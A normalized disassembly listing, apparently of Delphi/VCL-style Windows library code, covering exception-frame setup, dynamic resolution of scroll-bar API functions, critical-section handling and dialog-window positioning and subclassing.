mov eax [ edi + 0x10 ]
mov edx esi
call sub_4220b8
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x28 ]
inc esi
dec ebx
jne r-xdata
sub_423198
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor edx edx
mov [ ebp - 0x10 ] edx
mov ebx eax
xor eax eax
push ebp
push sub_42332a
push [ fs : eax ]
mov [ fs : eax ] esp
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x1
jne r-xdata
cmp [ ebx + 0xc ] 0x0
je r-xdata
mov eax esi
xor edx edx
call sub_4220b8
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov esi [ ebx + 0x10 ]
cmp [ esi + 0x8 ] 0x0
jle r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403228
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4232c5
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x10 ]
mov eax [ eax + 0x8 ]
dec eax
test eax eax
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423331
lea eax [ ebp - 0x10 ]
call sub_403f90
retn
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_4220b8
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
mov eax esi
xor edx edx
call sub_4220b8
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x14 ]
dec eax
jle r-xdata
inc eax
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x0
mov eax [ ebx + 0x10 ]
xor edx edx
call sub_4220b8
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
xor edx edx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x90 ]
mov eax [ ebx + 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
mov [ ebp - 0x8 ] eax
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x18 ]
mov eax [ eax + 0x4 ]
mov edx [ eax ]
call [ edx + 0x1c ]
jmp r-xdata
inc [ ebp - 0x8 ]
dec [ ebp - 0xc ]
jne r-xdata
lea edx [ ebp - 0x10 ]
mov eax [ esi + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xc ]
mov edx [ ebp - 0x10 ]
mov ecx esi
mov eax [ ebp - 0x4 ]
mov esi [ eax ]
call [ esi + 0x3c ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403258
retn
mov eax [ ebx + 0x10 ]
mov edx [ ebp - 0x8 ]
call sub_4220b8
mov esi eax
mov eax [ esi + 0x4 ]
mov edx [ eax ]
call [ edx + 0x18 ]
test al al
je r-xdata
sub_423338
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov edi eax
xor eax eax
push ebp
push sub_42341d
push [ fs : eax ]
mov [ fs : eax ] esp
xor ebx ebx
test esi esi
je r-xdata
mov eax [ edi + 0x18 ]
mov eax [ eax + 0x8 ]
test eax eax
jle r-xdata
lea eax [ edi + 0x24 ]
mov edx esi
call sub_403fe4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423424
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a0c
lea eax [ ebp - 0x8 ]
call sub_4055cc
retn
dec eax
jne r-xdata
xor edx edx
mov eax [ edi + 0x18 ]
call sub_4220b8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4055e4
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405610
mov eax [ ebp - 0x10 ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
xor edx edx
mov eax [ edi + 0x18 ]
call sub_4220b8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4055e4
mov ax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405610
mov eax [ ebp - 0xc ]
mov ecx esi
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x40 ]
mov ebx eax
jmp r-xdata
sub_423654
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_423747
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx [ ebp - 0x8 ]
call sub_403fe4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42374e
lea eax [ ebp - 0x18 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a0c
lea eax [ ebp - 0x10 ]
call sub_4055cc
retn
inc ebx
mov [ ebp - 0xc ] 0x0
inc [ ebp - 0xc ]
dec ebx
jne r-xdata
lea eax [ ebp - 0x18 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405610
mov eax [ ebp - 0x18 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x3c ]
jmp r-xdata
mov edx [ ebp - 0xc ]
mov eax [ esi + 0x14 ]
call sub_4220b8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x10 ]
call sub_4055e4
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x10 ]
mov ecx r-xdata
call sub_405610
mov eax [ ebp - 0x14 ]
mov ecx [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
mov edi [ eax ]
call [ edi + 0x38 ]
test al al
je r-xdata
sub_42376c
inc ebx
mov eax eax
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42384b
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
mov eax [ esi + 0x14 ]
mov eax [ eax + 0x8 ]
test eax eax
jne r-xdata
lea eax [ esi + 0x24 ]
mov edx ebx
call sub_403fe4
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b340
call sub_4039cc
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423852
lea eax [ ebp - 0x10 ]
mov edx [ r-xdata ]
mov ecx 0x2
call sub_404a0c
lea eax [ ebp - 0x8 ]
call sub_4055cc
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
lea eax [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405610
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
jmp r-xdata
mov edx edi
mov eax [ esi + 0x14 ]
call sub_4220b8
mov edx [ eax + 0x4 ]
lea eax [ ebp - 0x8 ]
call sub_4055e4
lea eax [ ebp - 0xc ]
mov edx [ ebp - 0x8 ]
mov ecx r-xdata
call sub_405610
mov eax [ ebp - 0xc ]
mov edx [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x30 ]
test al al
je r-xdata
sub_4238c8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov esi [ ebp + 0xc ]
mov eax [ ebp - 0x4 ]
call sub_404440
xor eax eax
push ebp
push sub_42395d
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov eax esi
dec ax
je r-xdata
lea eax [ ebx + 0x24 ]
mov edx [ ebp - 0x4 ]
call sub_403fe4
mov ecx [ ebp - 0x4 ]
mov edx [ ebp + 0x8 ]
mov eax ebx
call sub_423654
jmp r-xdata
dec ax
je r-xdata
mov bl 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423964
lea eax [ ebp - 0x4 ]
call sub_403f90
retn
mov eax ebx
call sub_423168
jmp r-xdata
dec ax
je r-xdata
mov eax ebx
call sub_423198
jmp r-xdata
jmp r-xdata
push esi
mov eax [ ebp + 0x8 ]
push eax
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax ebx
call sub_423338
sub_423988
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ esi + 0x10 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov eax [ esi + 0x14 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4220b8
cmp edi [ eax + 0x8 ]
jne r-xdata
mov eax [ esi + 0x18 ]
mov ebx [ eax + 0x8 ]
dec ebx
cmp ebx 0x0
jl r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_4220b8
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_41369c
pop edi
pop esi
pop ebx
retn
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_4220b8
cmp edi [ eax + 0x8 ]
jne r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x14 ]
call sub_41369c
dec ebx
cmp ebx 0xffffffff
jne r-xdata
mov edx ebx
mov eax [ esi + 0x18 ]
call sub_41369c
sub_423a14
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
mov eax esi
call sub_423128
cmp [ esi + 0xc ] 0x0
je r-xdata
mov eax [ esi + 0x18 ]
call sub_403258
mov eax [ esi + 0x14 ]
call sub_403258
mov eax [ esi + 0x10 ]
call sub_403258
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
lea eax [ esi + 0xc ]
call sub_4055cc
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_423a68
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423a9f
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423aa6
retn
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
mov [ rw-data ] eax
sub_423ab0
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423ad5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423adc
retn
sub_423ae8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423b19
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423b20
retn
mov eax [ rw-data ]
call sub_403258
sub_423b2c
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x10
mov al 0x1
sub_423b60
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp + 0x8 ]
push eax
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebp
retn 0x4
mov al 0x1
sub_423b88
push ebx
push esi
push r-xdata
call GetModuleHandleA
mov ebx eax
test ebx ebx
je r-xdata
pop esi
pop ebx
retn
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax EnableScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax ShowScrollBar
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollRange
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollInfo
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax GetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollPos
mov [ rw-data ] eax
push r-xdata
push ebx
call GetProcAddress
mov esi eax
mov [ rw-data ] esi
test esi esi
jne r-xdata
mov eax SetScrollInfo
mov [ rw-data ] eax
mov eax SetScrollRange
mov [ rw-data ] eax
sub_423e0a
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423e31
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423e38
retn
sub_423e4c
cwde
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x400423e ] ah
add [ eax ] al
add [ eax - 0x77ffbff0 ] ah
xor al 0x40
add [ esp + esi + 0x34980040 ] dl
inc eax
add [ esp + esi + 0x34900040 ] bl
inc eax
add al dh
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x32 ] cl
inc eax
add [ eax ] bl
aas
inc edx
add [ edi + edi ] bl
inc edx
add [ esi ] cl
push esp
push ebx
jns r-xdata
outsd
arpl [ eax + 0x72 ] bp
outsd
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + edx * 4 - 0x4 ] si
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + edi ] al
inc edx
add [ eax + eax ] bl
add [ eax ] al
dec esp
inc edx
add [ eax - 0x6bffbfcc ] cl
xor al 0x40
add [ eax - 0x63ffbfcc ] bl
xor al 0x40
add [ eax - 0xfffbfcc ] dl
xor [ eax ] eax
or al 0x32
inc eax
add [ eax + 0x3f ] ah
inc edx
add [ eax - 0x63ffbdc1 ] dl
aas
inc edx
add [ eax ] dl
push esp
inc ebx
jb r-xdata
je r-xdata
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
outsb
lea eax [ eax ]
retn
arpl [ ecx + 0x6c ] sp
push ebx
arpl [ gs : ecx + ebp * 2 + 0x6f ] si
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_423f20
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403228
lea eax [ esi + 0x4 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_403564
mov eax esi
pop esi
pop ebx
retn
call sub_4035bc
pop [ fs : 0x0 ]
add esp 0xc
sub_423f60
push ebx
push esi
call sub_4035cc
mov ebx edx
mov esi eax
lea eax [ esi + 0x4 ]
push eax
call DeleteCriticalSection
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403248
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4035b4
sub_423fb8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_423fdd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_423fe4
retn
sub_423ff0
push ebp
mov ebp esp
mov eax [ rw-data ]
call sub_423fa8
xor eax eax
push ebp
push sub_4241a7
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ rw-data ] 0x0
jle r-xdata
cmp [ rw-data ] 0x0
je r-xdata
dec [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4241ae
mov eax [ rw-data ]
call sub_423fb0
retn
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ rw-data ]
push eax
call FreeLibrary
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
sub_4241b0
push ebp
mov ebp esp
push ecx
push ebx
mov ebx rw-data
mov eax [ rw-data ]
call sub_423fa8
xor eax eax
push ebp
push sub_424563
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
cmp [ ebx ] 0x0
jne r-xdata
cmp [ ebx ] 0x0
seta [ ebp - 0x1 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42456a
mov eax [ rw-data ]
call sub_423fb0
retn
push r-xdata
call LoadLibraryA
mov [ ebx ] eax
cmp [ ebx ] 0x0
jbe r-xdata
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
push r-xdata
mov eax [ ebx ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_424914
cmp [ rw-data ] 0x0
jbe r-xdata
xor eax eax
call [ rw-data ]
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
call [ rw-data ]
test eax eax
jne r-xdata
retn
mov al 0x1
retn
sub_42493c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424984
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42498b
retn
cmp [ rw-data ] 0x0
jle r-xdata
mov eax [ rw-data ]
call sub_403258
call sub_423ff0
cmp [ rw-data ] 0x0
jg r-xdata
sub_4249ac
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4249d1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4249d8
retn
sub_4249e4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424a09
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424a10
retn
sub_424a1c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424a41
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424a48
retn
sub_424a54
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424a79
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424a80
retn
sub_424a8c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424ab1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424ab8
retn
sub_424ac4
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424ae9
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424af0
retn
sub_424afc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424b21
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424b28
retn
sub_424b3c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424b61
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424b68
retn
sub_424b74
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_424b99
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_424ba0
retn
sub_424f3c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi eax
push esp
push esi
call GetWindowRect
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax + 0x44 ]
test edx edx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_45600c
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x6c ]
test eax eax
je r-xdata
add edi eax
push edi
push 0x0
push esi
call SetWindowPos
add esp 0x10
pop edi
pop esi
pop ebx
retn
adc eax 0x0
mov eax [ rw-data ]
mov eax edx
call sub_4525ac
mov ebx eax
jmp r-xdata
mov edx [ rw-data ]
call sub_4525ac
mov ebx eax
jmp r-xdata
push 0x15
push 0x0
push 0x0
mov eax ebx
call sub_455d10
mov edi eax
mov eax ebx
call sub_455cf4
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
mov ecx 0x3
cdq
idiv ecx
add edi eax
push edi
mov eax ebx
call sub_455cdc
mov edi eax
mov eax ebx
call sub_455d28
sub eax [ esp + 0x18 ]
add eax [ esp + 0x10 ]
sar eax 0x1
jns r-xdata
sub_424ff0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
cmp esi 0x110
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x10
mov eax ebx
call sub_424f3c
mov eax [ rw-data ]
mov [ eax + 0x3c ] ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
push 0xfffffffc
push ebx
call SetWindowLongA
mov edx [ rw-data ]
mov [ edx + 0x34 ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push esi
push ebx
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
